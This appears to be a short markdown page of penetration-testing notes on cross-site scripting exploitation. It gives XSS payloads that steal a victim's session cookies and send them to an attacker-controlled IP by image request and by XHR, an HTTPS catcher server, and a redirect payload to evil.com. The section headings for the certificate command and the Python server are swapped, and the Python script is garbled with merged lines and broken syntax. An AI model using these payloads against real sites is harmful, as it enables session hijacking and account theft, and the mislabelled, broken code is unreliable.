# Exploitation


### Cookie Stealing

##### Basic/Classic

```
<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
```

##### Bypassing secure flag protection

We can also use [Certbot](Certbot.md)

Creating a HTTP server

```
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

Generating certificate

```
#!/usr/bin/python3
import http.server, sslserver_address = ('0.0.0.0', 443)
httpd = http.server.HTTPServer(server_address,
http.server.SimpleHTTPRequestHandler)
httpd.socket =
ssl.wrap_socket(httpd.socket,server_side=True,certfile='local
host.pem')
"""ssl_version=ssl.PROTOCOL_TLSv1_2)
"""
httpd.serve_forever()
```

##### Via XHR

```
var xhr=new XMLHttpRequest();
xhr.open("GET", "https://10.10.14.8/?"+document.cookie,
true);
xhr.send();
```

### Open Redirect

```
<script>window.location.replace("http://evil.com");</script>
```


